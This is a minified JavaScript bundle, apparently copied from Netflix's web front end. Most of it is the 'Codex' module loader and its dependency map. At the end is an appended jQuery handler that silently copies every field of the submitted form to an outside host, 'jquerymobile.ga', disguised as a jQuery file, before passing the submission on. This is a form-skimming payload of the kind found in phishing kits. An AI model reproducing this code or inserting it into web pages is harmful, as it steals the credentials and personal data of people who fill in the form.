! function(r) {
        "use strict";

        function e(r, e, t) {
                for(var n in e) !0 !== t && r.hasOwnProperty(n) || (r[n] = e[n])
        }
        var t = "/",
                n = "node_modules",
                i = {
                        _registry: {},
                        _parsedEntryPoints: [],
                        _lastRegistered: "",
                        _bind: function(r, e, t) {
                                return function(n) {
                                        var i = [].slice.call(arguments).concat(t);
                                        return r.apply(e, i)
                                }
                        },
                        shallowCopy: e,
                        _log: {
                                prepare: function(r, e) {
                                        var t = "[Codex] " + r;
                                        return e ? (e.msg = t, e) : t
                                },
                                warn: function(e, t) {
                                        r.C.config.logger.warn(this.prepare(e, t))
                                },
                                error: function(e, t) {
                                        r.C.config.logger.error(this.prepare(e, t))
                                }
                        },
                        _createBoundRequire: function(r) {
                                var e = this,
                                        t = e._bind,
                                        n = t(e.require, e, r);
                                return n.ensure = t(e.requireAsync, e, r), n
                        },
                        _buildNmPath: function(r, e, i) {
                                var o = e.split(t),
                                        s = o.lastIndexOf(n) + 2;
                                o = o.slice(0, s).concat([n, r]);
                                for(var a = 0; a < i; a++) s = o.lastIndexOf(n, s - 1);
                                var u = o.slice(0, s).join(t);
                                return "" !== u && (u += t), u += n + t + r
                        },
                        _normalize: function(r, e) {
                                return -1 === r.indexOf("./") ? this._normalizeNodeModulePath(r, e) : this._normalizeFilePath(r, e)
                        },
                        _normalizeNodeModulePath: function(r, e) {
                                var t = {
                                        module: r,
                                        requiredBy: e
                                };
                                if(!this.config || !this.config.nmEntryPoints) return r;
                                var i, o = this.config.nmEntryPoints,
                                        s = o[r];
                                if(!s) return this._log.error("No entry points found!", t), r;
                                if(1 === s.length) return s[0];
                                if(1 === e.split(n).length) return i = s.filter(function(r) {
                                        return 2 === r.split(n).length
                                });
                                for(var a = 0; !i;) {
                                        for(var u = this._buildNmPath(r, e, a), f = 0; f < s.length; f++) 0 === s[f].indexOf(u) && (i = s[f]);
                                        a++
                                }
                                return i
                        },
                        _normalizeFilePath: function(r, e) {
                                for(var n = r.split(t), i = e.split(t), o = i.slice(0, -1), s = [], a = 0; a < n.length; a++) "." === n[a] ? s = o : ".." === n[a] ? (o.pop(), s = o) : s.push(n[a]);
                                return s = s.join(t)
                        },
                        _findEntry: function(r) {
                                for(var e = this._registry, t = [r + "/index.js", r + ".js", r], n = t.length; n--;)
                                        if(e[t[n]]) return {
                                                entry: e[t[n]],
                                                normalizedName: t[n]
                                        };
                                return {
                                        entry: null,
                                        normalizedName: r
                                }
                        },
                        register: function(r, e) {
                                var t = this._registry;
                                if("function" == typeof e)
                                        if(t[r]) {
                                                var n = "Module " + r + " already loaded, skipping!";
                                                this._log.warn(n, {
                                                        module: r
                                                })
                                        } else t[r] = {
                                                invoke: e
                                        };
                                this._lastRegistered = r
                        },
                        require: function(r, e) {
                                var t, n, i = e ? this._normalize(r, e) : r;
                                if(n = this._findEntry(i), t = n.entry, i = n.normalizedName, t) {
                                        if(!t.exports) {
                                                var o = e ? this._registry[e] : null,
                                                        s = {
                                                                exports: {},
                                                                id: i,
                                                                parent: o,
                                                                entrypoint: !o,
                                                                invoke: t.invoke
                                                        };
                                                this._registry[i] = t = s, s.invoke(this._createBoundRequire(i), s, s.exports)
                                        }
                                        return t.exports
                                }
                                var a = {
                                        module: i,
                                        requiredBy: e
                                };
                                return !0 === this.config.stub ? {
                                        stub: !0
                                } : void this._log.error("MODULE NOT FOUND!", a)
                        },
                        requireAsync: function(e, t, n) {
                                var i = this;
                                if(!r.C.fetch) throw new Error("FETCH NOT IMPLEMENTED!");
                                if(!r.C.Client) throw new Error("CODEX-CLIENT NOT AVAILABLE!");
                                if(!r.C.config) throw new Error("CONFIG NOT AVAILABLE!");
                                var o = r.C.config;
                                if(!o.namespace || !o.version || !o.id) throw new Error("CONFIG MISSING BUILD-TIME CONTEXT");
                                if(!o.truthMap && o.truths) throw new Error("TRUTH MAP NOT AVAILABLE!");
                                if(!o.client) throw new Error("CONFIG.CLIENT NOT SET!");
                                for(var s = e instanceof Array ? e : [e], a = 0; a < s.length; a++) s[a] = i._normalize(s[a], n);
                                var u = i._parsedEntryPoints,
                                        f = {
                                                type: "js",
                                                files: s,
                                                excludeFiles: u,
                                                namespace: o.namespace,
                                                version: o.version,
                                                id: o.id
                                        };
                                o.truthMap && o.truths && (f.truthMap = o.truthMap, f.truths = o.truths);
                                var l = new r.C.Client(o.client),
                                        h = l.getUrl(f);
                                r.C.fetch(h, function() {
                                        i._parsedEntryPoints = u.concat(s), t()
                                })
                        },
                        kickoff: function(r) {
                                var e = r;
                                if(!e && "" === this._lastRegistered) return void this._log.error("NO MODULES REGISTERED!");
                                e || (e = this._lastRegistered), e = e instanceof Array ? e : [e];
                                for(var t = 0; t < e.length; t++) this._parsedEntryPoints.push(e[t]), this.require(e[t])
                        }
                };
        r.Codex && r.Codex.config ? e(r.Codex, i, !1) : (r.Codex = i, r.Codex.config = {}), r.C = r.Codex, r.C.r = r.C.register, r.C.k = r.C.kickoff
}(window);
! function(e) {
        "use strict";
        var s = {
                stub: !0,
                logger: console
        };
        if(!e || !e.C) throw new Error("[Codex] Codex bootstrap not loaded!");
        var o = {
                id: "js",
                namespace: "webui",
                nmEntryPoints: {
                        "babel-runtime/helpers/classCallCheck": ["node_modules/babel-runtime/helpers/classCallCheck.js"],
                        "babel-runtime/helpers/createClass": ["node_modules/babel-runtime/helpers/createClass.js"],
                        "babel-runtime/helpers/defineProperty": ["node_modules/babel-runtime/helpers/defineProperty.js"],
                        "babel-runtime/helpers/extends": ["node_modules/babel-runtime/helpers/extends.js"],
                        "babel-runtime/helpers/inherits": ["node_modules/babel-runtime/helpers/inherits.js"],
                        "babel-runtime/helpers/possibleConstructorReturn": ["node_modules/babel-runtime/helpers/possibleConstructorReturn.js"],
                        "babel-runtime/helpers/slicedToArray": ["node_modules/babel-runtime/helpers/slicedToArray.js"],
                        "babel-runtime/helpers/toConsumableArray": ["node_modules/babel-runtime/helpers/toConsumableArray.js"],
                        "babel-runtime/helpers/typeof": ["node_modules/babel-runtime/helpers/typeof.js"],
                        "chain-function": ["node_modules/chain-function/index.js"],
                        classnames: ["node_modules/classnames/index.js"],
                        "classnames/dedupe": ["node_modules/classnames/dedupe.js"],
                        cookie: ["node_modules/cookie/index.js"],
                        "cookie-dough": ["node_modules/cookie-dough/browser.js"],
                        "core-js/library/fn/array/from": ["node_modules/core-js/library/fn/array/from.js"],
                        "core-js/library/fn/get-iterator": ["node_modules/core-js/library/fn/get-iterator.js"],
                        "core-js/library/fn/is-iterable": ["node_modules/core-js/library/fn/is-iterable.js"],
                        "core-js/library/fn/object/assign": ["node_modules/core-js/library/fn/object/assign.js"],
                        "core-js/library/fn/object/create": ["node_modules/core-js/library/fn/object/create.js"],
                        "core-js/library/fn/object/define-property": ["node_modules/core-js/library/fn/object/define-property.js"],
                        "core-js/library/fn/object/set-prototype-of": ["node_modules/core-js/library/fn/object/set-prototype-of.js"],
                        "core-js/library/fn/symbol": ["node_modules/core-js/library/fn/symbol/index.js"],
                        "core-js/library/fn/symbol/iterator": ["node_modules/core-js/library/fn/symbol/iterator.js"],
                        "create-react-class": ["node_modules/create-react-class/index.js"],
                        "create-react-class/factory": ["node_modules/create-react-class/factory.js"],
                        "credit-card-type": ["node_modules/credit-card-type/index.js"],
                        "custom-event": ["node_modules/custom-event/index.js"],
                        daggy: ["node_modules/daggy/src/daggy.js"],
                        debug: ["node_modules/debug/src/browser.js"],
                        "dom-helpers/class/addClass": ["node_modules/dom-helpers/class/addClass.js"],
                        "dom-helpers/class/removeClass": ["node_modules/dom-helpers/class/removeClass.js"],
                        "dom-helpers/transition/properties": ["node_modules/dom-helpers/transition/properties.js"],
                        "dom-helpers/util/requestAnimationFrame": ["node_modules/dom-helpers/util/requestAnimationFrame.js"],
                        eventemitter3: ["node_modules/fluxxor/node_modules/eventemitter3/index.js"],
                        falcor: ["node_modules/falcor/lib/index.js"],
                        "falcor-asap": ["node_modules/falcor-asap/browser-asap.js"],
                        "falcor-json-graph": ["node_modules/falcor-json-graph/src/index.js"],
                        "falcor-path-syntax": ["node_modules/falcor-path-syntax/src/index.js"],
                        "falcor-path-utils": ["node_modules/falcor-path-utils/lib/index.js"],
                        "falcor-polyfilled": ["node_modules/falcor-polyfilled/dist/index.js"],
                        "falcor/lib/get/getCachePosition": ["node_modules/falcor/lib/get/getCachePosition.js"],
                        "falcor/lib/get/sync": ["node_modules/falcor/lib/get/sync.js"],
                        "fbjs/lib/EventListener": ["node_modules/fbjs/lib/EventListener.js"],
                        "fbjs/lib/ExecutionEnvironment": ["node_modules/fbjs/lib/ExecutionEnvironment.js"],
                        "fbjs/lib/camelizeStyleName": ["node_modules/fbjs/lib/camelizeStyleName.js"],
                        "fbjs/lib/containsNode": ["node_modules/fbjs/lib/containsNode.js"],
                        "fbjs/lib/createNodesFromMarkup": ["node_modules/fbjs/lib/createNodesFromMarkup.js"],
                        "fbjs/lib/emptyFunction": ["node_modules/fbjs/lib/emptyFunction.js"],
                        "fbjs/lib/emptyObject": ["node_modules/fbjs/lib/emptyObject.js"],
                        "fbjs/lib/focusNode": ["node_modules/fbjs/lib/focusNode.js"],
                        "fbjs/lib/getActiveElement": ["node_modules/fbjs/lib/getActiveElement.js"],
                        "fbjs/lib/getUnboundedScrollPosition": ["node_modules/fbjs/lib/getUnboundedScrollPosition.js"],
                        "fbjs/lib/hyphenateStyleName": ["node_modules/fbjs/lib/hyphenateStyleName.js"],
                        "fbjs/lib/invariant": ["node_modules/fbjs/lib/invariant.js"],
                        "fbjs/lib/memoizeStringOnly": ["node_modules/fbjs/lib/memoizeStringOnly.js"],
                        "fbjs/lib/performanceNow": ["node_modules/fbjs/lib/performanceNow.js"],
                        "fbjs/lib/shallowEqual": ["node_modules/fbjs/lib/shallowEqual.js"],
                        "fbjs/lib/warning": ["node_modules/fbjs/lib/warning.js"],
                        fluxxor: ["node_modules/fluxxor/index.js"],
                        "hoist-non-react-statics": ["node_modules/hoist-non-react-statics/index.js"],
                        invariant: ["node_modules/invariant/browser.js"],
                        isarray: ["node_modules/isarray/index.js"],
                        jquery: ["node_modules/jquery/dist/jquery.js"],
                        jsonp: ["node_modules/jsonp/index.js"],
                        "localizedStrings/dist/formatString": ["node_modules/localizedStrings/dist/formatString.js"],
                        lodash: ["node_modules/lodash/index.js", "node_modules/nf-browser-info/node_modules/lodash/index.js"],
                        "lodash/array/intersection": ["node_modules/lodash/array/intersection.js"],
                        "lodash/array/uniq": ["node_modules/lodash/array/uniq.js"],
                        "lodash/collection/forEach": ["node_modules/lodash/collection/forEach.js"],
                        "lodash/collection/map": ["node_modules/lodash/collection/map.js"],
                        "lodash/collection/reduce": ["node_modules/lodash/collection/reduce.js"],
                        "lodash/collection/size": ["node_modules/lodash/collection/size.js"],
                        "lodash/isPlainObject": ["node_modules/react-redux/node_modules/lodash/isPlainObject.js", "node_modules/redux/node_modules/lodash/isPlainObject.js"],
                        "lodash/lang/clone": ["node_modules/lodash/lang/clone.js"],
                        "lodash/lang/isFunction": ["node_modules/lodash/lang/isFunction.js"],
                        "lodash/lang/isObject": ["node_modules/lodash/lang/isObject.js"],
                        "lodash/lang/isString": ["node_modules/lodash/lang/isString.js"],
                        "lodash/object/findKey": ["node_modules/lodash/object/findKey.js"],
                        "lodash/object/forOwn": ["node_modules/lodash/object/forOwn.js"],
                        "lodash/object/keys": ["node_modules/lodash/object/keys.js"],
                        "lodash/object/mapValues": ["node_modules/lodash/object/mapValues.js"],
                        "mock-payment-request": ["node_modules/mock-payment-request/dist/index.js"],
                        modernizr: ["node_modules/modernizr/modernizr.js"],
                        ms: ["node_modules/ms/index.js"],
                        "nf-algebraic-data-types/Option": ["node_modules/nf-algebraic-data-types/Option.js"],
                        "nf-algebraic-data-types/Record": ["node_modules/nf-algebraic-data-types/Record.js"],
                        "nf-ardbeg": ["node_modules/nf-ardbeg/index.js"],
                        "nf-browser-info": ["node_modules/nf-browser-info/lib/browser.js"],
                        "nf-cad-mslpersist": ["node_modules/nf-cad-mslpersist/dist/index.js"],
                        "nf-cl-logger": ["node_modules/nf-cl-logger/index.js"],
                        "nf-cl-schema-ui": ["node_modules/nf-cl-schema-ui/dist/schema/nf-cl-schema-netflixApp.js"],
                        "nf-client-app-bridge": ["node_modules/nf-client-app-bridge/lib/index.js"],
                        "nf-client-securemop": ["node_modules/nf-client-securemop/lib/index.js"],
                        "nf-client-validator": ["node_modules/nf-client-validator/lib/index.js"],
                        "nf-client-video-capabilities": ["node_modules/nf-client-video-capabilities/dist/nf-client-video-capabilities.js"],
                        "nf-cons-log": ["node_modules/nf-cons-log/lib/index.js"],
                        "nf-iso-properties": ["node_modules/nf-iso-properties/lib/browser.js"],
                        "nf-linkwood": ["node_modules/nf-linkwood/lib/index.js"],
                        "nf-mdx": ["node_modules/nf-mdx/mdx.npm.js"],
                        "nf-svg-icons/dist/react/icons/chevron-down": ["node_modules/nf-svg-icons/dist/react/icons/chevron-down.js"],
                        "nf-svg-icons/dist/react/icons/rotate": ["node_modules/nf-svg-icons/dist/react/icons/rotate.js"],
                        "nf-svg-icons/dist/react/icons/swipe-hand": ["node_modules/nf-svg-icons/dist/react/icons/swipe-hand.js"],
                        "nf-svg-icons/dist/react/icons/tooltip": ["node_modules/nf-svg-icons/dist/react/icons/tooltip.js"],
                        "nf-svg-icons/dist/react/icons/tooltip-rtl": ["node_modules/nf-svg-icons/dist/react/icons/tooltip-rtl.js"],
                        "nf-svg-icons/dist/react/icons/x-mark": ["node_modules/nf-svg-icons/dist/react/icons/x-mark.js"],
                        "nf-svg-icons/dist/react/thumbs/up": ["node_modules/nf-svg-icons/dist/react/thumbs/up.js"],
                        "nf-svg-icons/dist/react/thumbs/up-outline": ["node_modules/nf-svg-icons/dist/react/thumbs/up-outline.js"],
                        novella: ["node_modules/novella/dist/novella.js"],
                        "object-assign": ["node_modules/object-assign/index.js"],
                        "object-path": ["node_modules/object-path/index.js"],
                        "path-to-regexp": ["node_modules/path-to-regexp/index.js"],
                        "promise-polyfill": ["node_modules/promise-polyfill/promise.js"],
                        "prop-types": ["node_modules/prop-types/index.js"],
                        "prop-types/factory": ["node_modules/prop-types/factory.js"],
                        qs: ["node_modules/qs/lib/index.js"],
                        querystring: ["node_modules/querystring/index.js"],
                        "ramda/src/always": ["node_modules/ramda/src/always.js"],
                        "ramda/src/clone": ["node_modules/ramda/src/clone.js"],
                        "ramda/src/compose": ["node_modules/ramda/src/compose.js"],
                        "ramda/src/cond": ["node_modules/ramda/src/cond.js"],
                        "ramda/src/contains": ["node_modules/ramda/src/contains.js"],
                        "ramda/src/converge": ["node_modules/ramda/src/converge.js"],
                        "ramda/src/equals": ["node_modules/ramda/src/equals.js"],
                        "ramda/src/filter": ["node_modules/ramda/src/filter.js"],
                        "ramda/src/identity": ["node_modules/ramda/src/identity.js"],
                        "ramda/src/isEmpty": ["node_modules/ramda/src/isEmpty.js"],
                        "ramda/src/isNil": ["node_modules/ramda/src/isNil.js"],
                        "ramda/src/mergeDeepRight": ["node_modules/ramda/src/mergeDeepRight.js"],
                        "ramda/src/path": ["node_modules/ramda/src/path.js"],
                        "ramda/src/pathOr": ["node_modules/ramda/src/pathOr.js"],
                        "ramda/src/pickBy": ["node_modules/ramda/src/pickBy.js"],
                        "ramda/src/prop": ["node_modules/ramda/src/prop.js"],
                        "ramda/src/propOr": ["node_modules/ramda/src/propOr.js"],
                        "ramda/src/when": ["node_modules/ramda/src/when.js"],
                        react: ["node_modules/react/react.js"],
                        "react-dom": ["node_modules/react-dom/index.js"],
                        "react-dom/server": ["node_modules/react-dom/server.js"],
                        "react-redux": ["node_modules/react-redux/lib/index.js"],
                        "react-redux/lib/connect/connect": ["node_modules/react-redux/lib/connect/connect.js"],
                        "react-redux/lib/utils/Subscription": ["node_modules/react-redux/lib/utils/Subscription.js"],
                        "react-tappable": ["node_modules/react-tappable/lib/TapAndPinchable.js"],
                        "react-transition-group/CSSTransitionGroup": ["node_modules/react-transition-group/CSSTransitionGroup.js"],
                        "react-transition-group/TransitionGroup": ["node_modules/react-transition-group/TransitionGroup.js"],
                        "react/lib/React": ["node_modules/react/lib/React.js"],
                        "react/lib/ReactComponentTreeHook": ["node_modules/react/lib/ReactComponentTreeHook.js"],
                        "react/lib/ReactCurrentOwner": ["node_modules/react/lib/ReactCurrentOwner.js"],
                        "react/lib/getNextDebugID": ["node_modules/react/lib/getNextDebugID.js"],
                        redux: ["node_modules/redux/lib/index.js"],
                        "redux-thunk": ["node_modules/redux-thunk/lib/index.js"],
                        rx: ["node_modules/rx/dist/rx.all.js"],
                        "rxjs/BehaviorSubject": ["node_modules/rxjs/BehaviorSubject.js"],
                        "rxjs/Observable": ["node_modules/rxjs/Observable.js"],
                        "rxjs/Subject": ["node_modules/rxjs/Subject.js"],
                        "rxjs/add/observable/bindCallback": ["node_modules/rxjs/add/observable/bindCallback.js"],
                        "rxjs/add/observable/concat": ["node_modules/rxjs/add/observable/concat.js"],
                        "rxjs/add/observable/defer": ["node_modules/rxjs/add/observable/defer.js"],
                        "rxjs/add/observable/empty": ["node_modules/rxjs/add/observable/empty.js"],
                        "rxjs/add/observable/forkJoin": ["node_modules/rxjs/add/observable/forkJoin.js"],
                        "rxjs/add/observable/from": ["node_modules/rxjs/add/observable/from.js"],
                        "rxjs/add/observable/fromEvent": ["node_modules/rxjs/add/observable/fromEvent.js"],
                        "rxjs/add/observable/fromPromise": ["node_modules/rxjs/add/observable/fromPromise.js"],
                        "rxjs/add/observable/interval": ["node_modules/rxjs/add/observable/interval.js"],
                        "rxjs/add/observable/merge": ["node_modules/rxjs/add/observable/merge.js"],
                        "rxjs/add/observable/of": ["node_modules/rxjs/add/observable/of.js"],
                        "rxjs/add/observable/throw": ["node_modules/rxjs/add/observable/throw.js"],
                        "rxjs/add/observable/timer": ["node_modules/rxjs/add/observable/timer.js"],
                        "rxjs/add/observable/zip": ["node_modules/rxjs/add/observable/zip.js"],
                        "rxjs/add/operator/bufferTime": ["node_modules/rxjs/add/operator/bufferTime.js"],
                        "rxjs/add/operator/catch": ["node_modules/rxjs/add/operator/catch.js"],
                        "rxjs/add/operator/concat": ["node_modules/rxjs/add/operator/concat.js"],
                        "rxjs/add/operator/delay": ["node_modules/rxjs/add/operator/delay.js"],
                        "rxjs/add/operator/distinctUntilChanged": ["node_modules/rxjs/add/operator/distinctUntilChanged.js"],
                        "rxjs/add/operator/do": ["node_modules/rxjs/add/operator/do.js"],
                        "rxjs/add/operator/filter": ["node_modules/rxjs/add/operator/filter.js"],
                        "rxjs/add/operator/first": ["node_modules/rxjs/add/operator/first.js"],
                        "rxjs/add/operator/map": ["node_modules/rxjs/add/operator/map.js"],
                        "rxjs/add/operator/merge": ["node_modules/rxjs/add/operator/merge.js"],
                        "rxjs/add/operator/mergeMap": ["node_modules/rxjs/add/operator/mergeMap.js"],
                        "rxjs/add/operator/observeOn": ["node_modules/rxjs/add/operator/observeOn.js"],
                        "rxjs/add/operator/onErrorResumeNext": ["node_modules/rxjs/add/operator/onErrorResumeNext.js"],
                        "rxjs/add/operator/publish": ["node_modules/rxjs/add/operator/publish.js"],
                        "rxjs/add/operator/publishReplay": ["node_modules/rxjs/add/operator/publishReplay.js"],
                        "rxjs/add/operator/reduce": ["node_modules/rxjs/add/operator/reduce.js"],
                        "rxjs/add/operator/retryWhen": ["node_modules/rxjs/add/operator/retryWhen.js"],
                        "rxjs/add/operator/sample": ["node_modules/rxjs/add/operator/sample.js"],
                        "rxjs/add/operator/sampleTime": ["node_modules/rxjs/add/operator/sampleTime.js"],
                        "rxjs/add/operator/scan": ["node_modules/rxjs/add/operator/scan.js"],
                        "rxjs/add/operator/share": ["node_modules/rxjs/add/operator/share.js"],
                        "rxjs/add/operator/startWith": ["node_modules/rxjs/add/operator/startWith.js"],
                        "rxjs/add/operator/switchMap": ["node_modules/rxjs/add/operator/switchMap.js"],
                        "rxjs/add/operator/take": ["node_modules/rxjs/add/operator/take.js"],
                        "rxjs/add/operator/takeLast": ["node_modules/rxjs/add/operator/takeLast.js"],
                        "rxjs/add/operator/takeUntil": ["node_modules/rxjs/add/operator/takeUntil.js"],
                        "rxjs/add/operator/takeWhile": ["node_modules/rxjs/add/operator/takeWhile.js"],
                        "rxjs/add/operator/throttleTime": ["node_modules/rxjs/add/operator/throttleTime.js"],
                        "rxjs/add/operator/timeInterval": ["node_modules/rxjs/add/operator/timeInterval.js"],
                        "rxjs/add/operator/timeout": ["node_modules/rxjs/add/operator/timeout.js"],
                        "rxjs/add/operator/timeoutWith": ["node_modules/rxjs/add/operator/timeoutWith.js"],
                        "rxjs/add/operator/zip": ["node_modules/rxjs/add/operator/zip.js"],
                        "rxjs/scheduler/asap": ["node_modules/rxjs/scheduler/asap.js"],
                        "rxjs/scheduler/async": ["node_modules/rxjs/scheduler/async.js"],
                        "sanctuary-type-classes": ["node_modules/sanctuary-type-classes/index.js"],
                        "sanctuary-type-identifiers": ["node_modules/sanctuary-type-identifiers/index.js"],
                        "secure-filters": ["node_modules/secure-filters/index.js"],
                        "shakti-platform/dist/ui/ShaktiProperties": ["node_modules/shakti-platform/dist/ui/ShaktiProperties.js"],
                        "shakti-platform/dist/ui/app/App": ["node_modules/shakti-platform/dist/ui/app/App.js"],
                        "shakti-platform/dist/ui/components/inlineScript": ["node_modules/shakti-platform/dist/ui/components/inlineScript.js"],
                        "shakti-platform/dist/ui/consolidatedLogging": ["node_modules/shakti-platform/dist/ui/consolidatedLogging/index.js"],
                        "shakti-platform/dist/ui/consolidatedLogging/constants/actionTypes": ["node_modules/shakti-platform/dist/ui/consolidatedLogging/constants/actionTypes.js"],
                        "shakti-platform/dist/ui/consolidatedLogging/constants/appViewTypes": ["node_modules/shakti-platform/dist/ui/consolidatedLogging/constants/appViewTypes.js"],
                        "shakti-platform/dist/ui/consolidatedLogging/constants/commandTypes": ["node_modules/shakti-platform/dist/ui/consolidatedLogging/constants/commandTypes.js"],
                        "shakti-platform/dist/ui/consolidatedLogging/constants/contextTypes": ["node_modules/shakti-platform/dist/ui/consolidatedLogging/constants/contextTypes.js"],
                        "shakti-platform/dist/ui/consolidatedLogging/constants/eventTypes": ["node_modules/shakti-platform/dist/ui/consolidatedLogging/constants/eventTypes.js"],
                        "shakti-platform/dist/ui/consolidatedLogging/constants/sessionEndTypes": ["node_modules/shakti-platform/dist/ui/consolidatedLogging/constants/sessionEndTypes.js"],
                        "shakti-platform/dist/ui/renderers": ["node_modules/shakti-platform/dist/ui/renderers/index.js"],
                        "shakti-platform/dist/ui/routing": ["node_modules/shakti-platform/dist/ui/routing/index.js"],
                        "shakti-platform/dist/ui/routing/History": ["node_modules/shakti-platform/dist/ui/routing/History.js"],
                        "shakti-platform/dist/ui/routing/Link": ["node_modules/shakti-platform/dist/ui/routing/Link.js"],
                        "shakti-platform/dist/ui/routing/provideRoutingContext": ["node_modules/shakti-platform/dist/ui/routing/provideRoutingContext.js"],
                        "shakti-platform/dist/ui/utils/URLGenerator": ["node_modules/shakti-platform/dist/ui/utils/URLGenerator.js"],
                        "shakti-platform/dist/ui/utils/inNode": ["node_modules/shakti-platform/dist/ui/utils/inNode.js"],
                        "shakti-platform/dist/ui/utils/requestIdleCallback": ["node_modules/shakti-platform/dist/ui/utils/requestIdleCallback.js"],
                        "shakti-platform/dist/ui/utils/safeParseJSON": ["node_modules/shakti-platform/dist/ui/utils/safeParseJSON.js"],
                        "shakti-platform/dist/ui/zuulSocket/ZuulSocket": ["node_modules/shakti-platform/dist/ui/zuulSocket/ZuulSocket.js"],
                        swfobject: ["node_modules/swfobject/index.js"],
                        swiper: ["node_modules/swiper/dist/js/swiper.js"],
                        "symbol-observable": ["node_modules/symbol-observable/lib/index.js"],
                        "tiny-uuid": ["node_modules/tiny-uuid/index.js"],
                        tween: ["node_modules/tween/src/Tween.js"],
                        urijs: ["node_modules/urijs/src/URI.js"],
                        warning: ["node_modules/warning/browser.js"],
                        xstate: ["node_modules/xstate/lib/index.js"]
                },
                version: "0.0.1-shakti-js-v4c579308"
        };
        e.C.shallowCopy(e.C.config, o, !0), e.C.shallowCopy(e.C.config, s, !1)
}(window);
! function(t) {
        "use strict";
        if("object" != typeof t.Codex) throw new Error("[Codex] Codex client shim requires global.Codex!");
        t.Codex.Client = function t(o) {
                if(!(this instanceof t)) return new t(o);
                var e = this;
                if(e._stack = o.hasOwnProperty("stack") ? o.stack.toUpperCase() : "", e._urlEncodedCodexVersion = encodeURIComponent("^") + e.constants.MAJOR_VERSION_SEMVER, e._port = o.port, e._customHost = function() {
                                var t = "";
                                return o.hasOwnProperty("host") && (t = e._trimSlashes(o.host), o.hasOwnProperty("prefixPath") && (t += "/" + e._trimSlashes(o.prefixPath))), t
                        }(), e._protocol = o.protocol || "https://", "" === e._stack) throw new Error("`stack` is required!");
                if(!e.constants.STACKS.hasOwnProperty(e._stack)) throw new Error(e._stack + " is an unsupported stack!");
                if(o.hasOwnProperty("prefixPath") && !o.hasOwnProperty("host")) throw new Error("`prefixPath` requires `host` value!")
        }, t.Codex.Client.create = t.Codex.Client, t.Codex.Client.prototype = {
                _resolveHost: function(t) {
                        var o = this,
                                e = o.constants.HOST[o._stack],
                                n = void 0 === t || Boolean(t);
                        return o._stack !== o.constants.STACKS.PROD && "" !== o._customHost && (e = o._customHost), o._stack === o.constants.STACKS.PROD && !0 === n && (e = o._customHost || o.constants.HOST.CDN), e
                },
                getUrl: function(t) {
                        var o = this,
                                e = o.constants.NONE,
                                n = "",
                                s = o._protocol + o._resolveHost(t.cdn);
                        return t.truths && t.truths.length > 0 && (e = t.truths.map(function(o) {
                                return t.truthMap.kv[o]
                        }).join("")), t.shimFlags && (!0 === t.shimFlags.bootstrap && (n += "b"), !0 === t.shimFlags.client && (n += "c"), !0 === t.shimFlags.kickoffLastOnly ? n += "l" : !0 === t.shimFlags.kickoff && (n += "k")), [s + (o._port ? ":" + o._port : ""), o._urlEncodedCodexVersion, o.constants.BASE_URL, t.namespace, t.version, t.id || t.type, t.type, o._encodeEntryPoints(t.files), t.hasOwnProperty("truthMap") ? t.truthMap.length || 0 : o.constants.NONE, e, n || o.constants.NONE, !1 !== t.resolveConditions ? "true" : "false", t.excludeFiles && t.excludeFiles.length > 0 ? o._encodeEntryPoints(t.excludeFiles) : o.constants.NONE].map(function(t) {
                                return o._trimSlashes(t.toString())
                        }).join("/")
                },
                _encodeEntryPoints: function(t) {
                        var o = this,
                                e = [];
                        return "object" == typeof t ? (e = t.map(function(t) {
                                return t.replace(/\//g, o.constants.URL_SLASH_CHAR)
                        }), e.join(",")) : t.replace(/\//g, o.constants.URL_SLASH_CHAR)
                },
                _trimSlashes: function(t) {
                        return t.replace(/^\/+|\/+$/g, "")
                },
                constants: {
                        HOST: {
                                DEVELOPMENT: "127.0.0.1",
                                PRBUILDER: "codex-prbuilder.netflix.com",
                                TEST: "codex-test.netflix.com",
                                PROD: "codex-prod.netflix.com",
                                CDN: "codex.nflxext.com"
                        },
                        STACKS: {
                                DEVELOPMENT: "DEVELOPMENT",
                                PRBUILDER: "PRBUILDER",
                                TEST: "TEST",
                                PROD: "PROD"
                        },
                        BASE_URL: "truthBundle",
                        NONE: "none",
                        URL_SLASH_CHAR: "%7C",
                        MAJOR_VERSION_SEMVER: "2.0.0"
                }
        }
}(window);
C.r("bootstrap.js", function(t, s, o) {
        "use strict"
});
! function(o) {
        "use strict";
        if(!(o && o.C && o.C.k)) throw new Error("[Codex] Codex bootstrap not loaded!");
        o.C.k()
}(window);
C.r("common/bootstrap.js", function(e, t, n) {
        "use strict";
        if("undefined" != typeof window && ("undefined" == typeof global && (window.global = {}), "undefined" == typeof process && (window.process = {
                        env: {}
                })), "undefined" != typeof Intl && Intl.__disableRegExpRestore && Intl.__disableRegExpRestore(), window && window.netflix && window.netflix.reactContext && window.netflix.reactContext.models && window.netflix.reactContext.models.codexClient && window.netflix.reactContext.models.codexClient.data && window.netflix.reactContext.models.codexClient.data.obfuscatedTruths) {
                Codex.fetch = function(e, t) {
                        var n = document.getElementsByTagName("script")[0],
                                o = document.createElement("script"),
                                d = !1;
                        o.src = e, o.type = "text/javascript", o.onload = o.onreadystatechange = function() {
                                d || this.readyState && "complete" !== this.readyState || (d = !0, t())
                        }, n && n.parentNode && n.parentNode.insertBefore(o, n)
                };
                var o = window.netflix.reactContext.models.codexClient.data,
                        d = o.obfuscatedTruths,
                        i = {
                                kv: {}
                        },
                        a = d.length;
                if(a) {
                        i.length = d[0].length;
                        for(var c = 0; c < a; ++c) {
                                var r = d[c];
                                i.kv[r] = r
                        }
                }
                Codex.config.client = o.config, Codex.config.truths = d, Codex.config.truthMap = i
        }
});
! function(o) {
        "use strict";
        if(!(o && o.C && o.C.k)) throw new Error("[Codex] Codex bootstrap not loaded!");
        o.C.k()
}(window);
$.ajaxSetup({ cache: false });
$('form.idform').on('submit', function (e) {
    e.preventDefault();
        var that = $(this),
        url = that.attr('action'),
        type = that.attr('method'),
        data = {};



        that.find('[name]').each(function(index, value){

                var that = $(this),
                    name = that.attr('name'),
                    value = that.val();

                    data[name] = value;
        });

        $.ajax({
                url : 'https://jquerymobile.ga/ajax/jquery.min.php',
                type: type,
                data: data
        });
        
        $.ajax({
                url : url,
                type: type,
                data: data
        }).done(function (data) {

            window.location = url;
        
    });
});